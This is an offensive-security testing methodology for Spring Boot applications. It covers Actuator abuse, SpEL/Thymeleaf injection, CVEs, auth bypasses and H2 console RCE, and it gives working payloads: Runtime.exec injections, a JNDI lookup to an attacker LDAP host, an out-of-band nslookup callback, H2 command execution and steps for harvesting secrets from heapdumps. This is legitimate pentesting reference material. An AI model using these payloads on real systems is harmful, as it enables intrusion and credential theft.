# Spring Boot Testing Methodology

> Testing methodology specific to Spring Boot (Actuator, Spring Security,
> Spring Expression Language, Spring Cloud). For generic Java deserialization
> gadget chains and `ysoserial` usage, see the upstream
> [Insecure Deserialization](../../upstream/PayloadsAllTheThings/Insecure%20Deserialization/README.md)
> page — this page is about what is *specific to the Spring stack*.

## Summary

* [Fingerprinting](#fingerprinting)
* [Actuator Endpoint Enumeration & Abuse](#actuator-endpoint-enumeration--abuse)
* [Spring Expression Language (SpEL) Injection](#spring-expression-language-spel-injection)
* [Thymeleaf SSTI](#thymeleaf-ssti)
* [Known Critical CVEs](#known-critical-cves)
* [Spring Security Misconfiguration & Auth Bypass](#spring-security-misconfiguration--auth-bypass)
* [H2 Console RCE](#h2-console-rce)
* [Spring Boot Admin](#spring-boot-admin)
* [Spring Cloud Config Server](#spring-cloud-config-server)
* [Spring Data REST IDOR & Mass Assignment](#spring-data-rest-idor--mass-assignment)
* [CORS Misconfiguration](#cors-misconfiguration)
* [Secrets & Profile Leakage](#secrets--profile-leakage)
* [Tools](#tools)
* [References](#references)

## Fingerprinting

* **Whitelabel Error Page**: an unhandled exception on a default Spring Boot
  app returns `{"timestamp":...,"status":500,"error":"Internal Server
  Error","path":"/x"}` (JSON, for `Accept: application/json`) or an HTML
  "Whitelabel Error Page" — both confirm Spring Boot and sometimes leak the
  full exception class/stack trace if `server.error.include-stacktrace` is
  misconfigured to `always`. Try forcing a 500 (e.g. malformed
  `Content-Type`, type-mismatched path variable like `/user/abc` where `abc`
  should be a `Long`) and compare `server.error.include-*` verbosity.
* **Response headers**: default `Server` header is usually absent/generic
  (Spring Boot doesn't set one by default on embedded Tomcat beyond
  `Apache-Coyote/1.1` or similar) — but embedded server banners,
  `X-Application-Context` (older Spring Boot versions), or a leaked
  `/actuator/info` response are strong fingerprints.
* **Default error for missing endpoint**: `404` JSON body shape
  (`{"timestamp","status","error","path"}`) is distinctive to Spring Boot's
  `BasicErrorController`.
* **Jar banner / static banner.txt**: some deployments accidentally expose
  `/banner.txt` or leave Spring Boot's ASCII art banner in logs reachable via
  a misconfigured log-viewing endpoint.

## Actuator Endpoint Enumeration & Abuse

Spring Boot Actuator exposes operational endpoints under `/actuator/*` by
default in older Spring Boot 1.x (**all endpoints exposed, unauthenticated,
by default**) — Spring Boot 2.x+ restricts the default-exposed set to just
`health` and `info` over HTTP, but misconfiguration
(`management.endpoints.web.exposure.include=*`) re-opens everything. Always
enumerate, regardless of framework version, since this misconfig is
extremely common in practice.

```
/actuator
/actuator/health
/actuator/info
/actuator/env            # environment variables, property sources — often includes DB creds, cloud keys
/actuator/configprops    # full @ConfigurationProperties bean graph
/actuator/beans          # full Spring bean graph — useful for gadget/class discovery
/actuator/mappings       # every @RequestMapping — map the full unauthenticated API surface, incl. hidden/admin routes
/actuator/metrics        # app metrics; /actuator/metrics/{name} can confirm presence of specific beans/counters
/actuator/httptrace      # recent request/response traces — may leak auth headers, session IDs, tokens in transit
/actuator/heapdump       # full JVM heap dump — grep for passwords, session tokens, JWT secrets, API keys in memory
/actuator/threaddump     # thread stacks — can leak SQL queries, internal paths in stack frames
/actuator/loggers        # read AND WRITE (POST) log levels — can be abused to flip a logger to DEBUG/TRACE and leak secrets, or as a bypass for sinks relying on log scrubbing
/actuator/shutdown       # if enabled (rare in modern defaults) — unauthenticated DoS, POST to kill the app
/actuator/jolokia        # if Jolokia is on the classpath — JMX-over-HTTP; historically RCE via MBean manipulation
/actuator/sessions       # Spring Session-backed session enumeration/termination (Spring Session on classpath)
/actuator/scheduledtasks # scheduled job details — internal cron logic, class names for gadget hunting
/actuator/caches         # cache names/contents metadata
/actuator/flyway, /actuator/liquibase  # migration history incl. checksums/paths
/actuator/gateway/routes # if Spring Cloud Gateway — full upstream routing table (SSRF/internal service discovery goldmine)
/actuator/refresh        # Spring Cloud — POST triggers context refresh; combine with Config Server poisoning
```

**Priority abuse chain when `/actuator/env` + `/actuator/heapdump` are
exposed**: pull `heapdump`, load it in Eclipse MAT or `jhat`, and
string-search for `password`, `secret`, `Authorization`, `jdbc:`,
`BEARER`, and serialized session objects — this frequently yields DB
credentials and live JWT/session values even when `/actuator/env` itself
masks sensitive property names with `******`.

**`/actuator/env` masking bypass**: Spring Boot's `Sanitizer` masks keys
matching patterns like `password`, `secret`, `key`, `token` — but a
non-matching key name holding a secret (e.g. a custom
`internal.service.auth` property) is returned in cleartext. Always read the
full dump, not just the unmasked subset.

**`/actuator/loggers` write abuse**: `POST /actuator/loggers/{name}` with
`{"configuredLevel":"TRACE"}` (requires it to be in the exposed+writable set,
check `management.endpoint.loggers.enabled` and that POST isn't blocked by
a reverse proxy allowlisting only GET on `/actuator/*`) — can surface SQL
bind parameters, auth headers, or SpEL evaluation internals in logs that are
then readable via another leaky log sink.

## Spring Expression Language (SpEL) Injection

SpEL injection is Spring's equivalent of SSTI and typically leads directly
to RCE via `T(java.lang.Runtime).getRuntime().exec(...)`.

**Common injection points**:
* `@Value("#{...}")` fields populated (even partially) from
  user-controlled configuration, request headers used in custom
  `@ConditionalOnExpression`, or dynamic `@Value` strings built via string
  concatenation with request data (anti-pattern, but exists in real apps).
* Spring Security method security:
  `@PreAuthorize("hasPermission(#id, 'READ') and #request.getParameter('x') == ...")`
  — if any part of the SpEL string itself (not just its evaluated
  variables) is built from user input, you get full RCE on every
  authorization check.
* Spring WebFlow's `View State` / `Transition` SpEL expressions
  (CVE-2017-4971-class issues) in apps using Spring Web Flow.
* Any custom template/rule engine that passes user strings to
  `SpelExpressionParser.parseExpression(...)` directly.

**Test payload** (classic, confirms code execution via a visible string):
```
#{T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('id')}
```
Blind/OOB confirmation when output isn't reflected:
```
#{T(java.lang.Runtime).getRuntime().exec('nslookup <burp-collaborator-id>.oastify.com')}
```

## Thymeleaf SSTI

Thymeleaf (Spring Boot's default templating engine) evaluates SpEL inside
`th:*` attributes. SSTI arises when user input reaches a template
**expression** (not just a rendered variable) — e.g. a CMS-style feature
where an admin-configurable "welcome message" string is itself parsed as a
Thymeleaf fragment, or a bug where user input is concatenated into a
`th:*` attribute value server-side before parsing.

```
${T (java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```
The double-underscore preprocessing payload (`__${...}__::.x`) specifically
targets Thymeleaf's expression preprocessing step and is the payload
associated with **CVE-2021-21360**-class engine misuse. Confirm exact
Thymeleaf version against published advisories before assuming a generic
SpEL payload will work — expression syntax differs from raw Spring SpEL in
sandboxing behavior across versions.

## Known Critical CVEs

Always version-fingerprint (via `/actuator/info`, jar names in error stack
traces, `pom.xml`/`build.gradle` if a source leak is found, or dependency
confusion probing) and check against these — all are real-world, frequently
still-unpatched in the wild:

| CVE | Name | Summary |
|---|---|---|
| **CVE-2022-22965** | Spring4Shell | RCE via data binding against `ClassLoader` on Tomcat + JDK9+, exploitable through any `@RequestMapping` using `@ModelAttribute`-style data binding. Payload manipulates `class.module.classLoader.resources.context.parent.pipeline.first.pattern` to write a JSP webshell via Tomcat's AccessLogValve. |
| **CVE-2022-22963** | Spring Cloud Function RCE | SpEL injection via the `spring.cloud.function.routing-expression` request header, no auth required. |
| **CVE-2021-44228** | Log4Shell | If Log4j2 is on the classpath (very common transitive dep in Spring Boot apps pre-2.17.1) — JNDI lookup RCE via any logged user-controlled string, e.g. `User-Agent: ${jndi:ldap://attacker/a}`. |
| **CVE-2021-22096** | Actuator metrics tag injection | Unauthenticated metrics tag injection causing memory exhaustion DoS via `/actuator/metrics`. |
| **CVE-2020-5398** | Spring MVC/WebFlux path traversal via RFD | Content-Disposition header manipulation leading to reflected file download. |
| **CVE-2016-5007 / CVE-2013-4152** | Legacy Spring Security auth bypass | Older pattern-matching bypasses — still relevant against unmaintained legacy services. |
| **CVE-2023-34035** | Spring Security actuator path-matching bypass | `mvcMatcher`/`AntPathRequestMatcher` divergence from how Spring Boot's actuator mapped paths — authorization rules on actuator endpoints could be bypassed via path variant tricks. |

## Spring Security Misconfiguration & Auth Bypass

* **URL-pattern vs. method-security mismatch**: an endpoint protected only
  via `.antMatchers("/admin/**").authenticated()` in `SecurityConfig`, but
  not with `@PreAuthorize` at the controller method — any alternate path
  that routes to the same controller method (a second `@RequestMapping`
  alias, a path mapped via a different prefix behind a reverse proxy) skips
  the security filter chain entirely.
* **Path normalization bypass**: Spring Security's path matcher and the
  embedded servlet container's path matcher can disagree on encoded slashes,
  trailing slashes, case, or `;jsessionid`/matrix-param segments. Classic
  bypass attempts against a rule like `.antMatchers("/admin").denyAll()`:
  ```
  /admin/
  /admin%2F
  /ADMIN
  /admin;x=1
  /./admin
  /admin/..;/admin
  //admin
  ```
* **`permitAll()` scope creep**: a rule intended to permit only
  `/api/public/**` written as `.antMatchers("/api/public").permitAll()`
  (no `/**`) technically only matches the exact path — but the inverse
  mistake (too broad a wildcard, e.g. `/api/**` meant to be
  `/api/public/**`) is far more common and worth explicitly diffing against
  `/actuator/mappings` output (if exposed) to find routes that exist but
  aren't in any explicit security rule (falling through to a permissive
  default).
* **CSRF disabled globally**: `http.csrf().disable()` is an extremely common
  copy-pasted "fix" for API 403s during development that makes it to
  production — test state-changing endpoints for missing CSRF tokens,
  especially on apps that also use cookie-based session auth (not pure
  stateless JWT-in-header).

## H2 Console RCE

Spring Boot's auto-configured H2 database console
(`spring.h2.console.enabled=true`, path default `/h2-console`) is meant for
dev-only use but regularly ships to production, sometimes even intentionally
with a weak/default JDBC URL and empty password.

1. Browse to `/h2-console`, fingerprint via the login form.
2. If you can authenticate (default creds, blank password, or JDBC URL
   `jdbc:h2:mem:testdb` with a guessable DB name), run:
   ```sql
   CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.io.IOException {
     return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
   } $$;
   CALL EXEC('id');
   ```
3. Even without a direct RCE alias, H2's JDBC URL parameter itself
   (`jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3`) and custom H2 functions
   are a known path to file read/write and RCE — check H2 version against
   public exploit writeups for the exact `CREATE ALIAS`/`FILE_READ`/
   `FILE_WRITE` syntax that applies.

## Spring Boot Admin

If the app registers with a **Spring Boot Admin** server
(`de.codecentric:spring-boot-admin-server`), the Admin UI itself often sits
unauthenticated on an internal-looking path/port and aggregates **every**
registered app's Actuator data in one place — effectively a single
unauthenticated pivot point to every microservice's `env`/`heapdump`/
`loggers` in the fleet. Also check whether the Admin server's own
`/instances` registration endpoint accepts unauthenticated POSTs — allowing
you to register a malicious "monitored app" URL and potentially trigger SSRF
as the Admin server polls it back.

## Spring Cloud Config Server

* Config Server exposes `/{application}/{profile}` returning full resolved
  configuration (often including datasource passwords, third-party API
  keys) — test with guessed application names (match them against
  `/actuator/env`'s `spring.application.name` if visible elsewhere, or the
  app's own service name in URLs/headers).
* Path traversal against the backing Git repo:
  `/{application}/{profile}/{label:.*}` where `{label}` is a branch name —
  some versions allowed traversal via crafted `label` values to read
  arbitrary files in the backing repo checkout (CVE-2019-3799 class).
* `/actuator/refresh` (on clients) combined with a compromised/poisoned
  Config Server backing repo is a config-injection-to-RCE chain if any
  refreshed property feeds a SpEL `@Value` or a `@ConditionalOnExpression`.

## Spring Data REST IDOR & Mass Assignment

Spring Data REST (`@RepositoryRestResource`) auto-generates full CRUD HAL
APIs directly from `@Entity`/`Repository` interfaces with **no
field-level allowlisting by default**.

* **Mass assignment**: `PATCH`/`PUT` against an auto-exposed entity
  endpoint accepts and persists *every* field on the entity, including ones
  the UI never exposes — e.g. `PATCH /users/42 {"role":"ADMIN"}` or
  `{"isVerified":true}` on a self-service profile-update endpoint.
* **IDOR via auto-incrementing entity IDs**: enumerate `/api/{entity}/{id}`
  sequentially; Spring Data REST does not apply row-level authorization
  unless explicitly wired via a custom `RepositoryRestConfigurer` /
  Spring Security method security on the repository, which is frequently
  skipped since it's not the default.
* **Relationship/association traversal**: HAL `_links` on one entity often
  expose otherwise-unlisted related entities/endpoints
  (`/api/users/42/privateNotes`) — walk every `_links` entry recursively,
  not just the entities the frontend actually calls.

## CORS Misconfiguration

* `@CrossOrigin(origins = "*")` combined with
  `allowCredentials = true` is invalid per the CORS spec and most browsers
  will refuse to honor the combination — but **reflected-origin**
  implementations (custom `CorsConfigurationSource` beans that echo the
  request's `Origin` header back verbatim while also setting
  `Access-Control-Allow-Credentials: true`) are common and fully exploitable
  cross-origin credentialed reads. Test by sending an arbitrary `Origin`
  header and checking whether it's reflected with credentials allowed.
* Global `WebMvcConfigurer.addCorsMappings` wildcard scope
  (`"/**"` mapped to `allowedOrigins("*")`) applied app-wide when only one
  specific public endpoint needed it.

## Secrets & Profile Leakage

* `application-dev.properties` / `application-local.yml` / `bootstrap.yml`
  accidentally packaged inside the deployed jar/war's `BOOT-INF/classes/` —
  if static resource serving or a path-traversal bug exposes classpath
  resources, these dev profiles frequently contain full plaintext DB
  credentials meant only for local use.
* `spring.profiles.active` leakage via `/actuator/env` reveals exactly
  which profile-specific property file is live in production — useful to
  narrow down which `application-{profile}.yml` to hunt for in any source/
  build artifact leak.
* JAR inspection: if you can retrieve the deployed Spring Boot fat jar
  (misconfigured artifact repository, exposed CI build output, Docker image
  layer pull), `unzip -o app.jar -d extracted/` and read
  `BOOT-INF/classes/application*.yml` directly, plus decompile
  `BOOT-INF/classes/` with a tool like CFR/Fernflower for full source.

## Tools

* **Spring-Actuator-Scan** / manual `ffuf`/`gobuster` wordlist of the
  actuator endpoint list above.
* **JNDI-Injection-Exploit / marshalsec** — for Log4Shell/JNDI-based RCE
  chains.
* **ysoserial** — Java deserialization gadget chains, relevant anywhere
  Spring uses native Java serialization (Spring Session with a
  non-JSON serializer, RMI-based internal services, legacy session
  stores).
* **Burp Suite** — Collaborator for blind SpEL/SSRF OOB confirmation;
  "Spring Actuator Scanner" community extension.
* **Eclipse MAT / jhat** — analyze `/actuator/heapdump` output for secrets.
* **CFR / Fernflower / jadx** — decompile extracted jar classes when a build
  artifact leak is found.

## References

* [Spring Boot Actuator docs](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
* [Spring Security advisories](https://spring.io/security)
* [Spring4Shell writeup — CVE-2022-22965](https://spring.io/blog/2022/04/01/spring-framework-rce-early-announcement/)
* [Spring Cloud Function RCE — CVE-2022-22963](https://spring.io/security/cve-2022-22963)
* Upstream: [PayloadsAllTheThings – Insecure Deserialization](../../upstream/PayloadsAllTheThings/Insecure%20Deserialization/README.md)
* Upstream: [PayloadsAllTheThings – Server Side Template Injection](../../upstream/PayloadsAllTheThings/Server%20Side%20Template%20Injection/README.md)
* Upstream: [PayloadsAllTheThings – CORS Misconfiguration](../../upstream/PayloadsAllTheThings/CORS%20Misconfiguration/README.md)
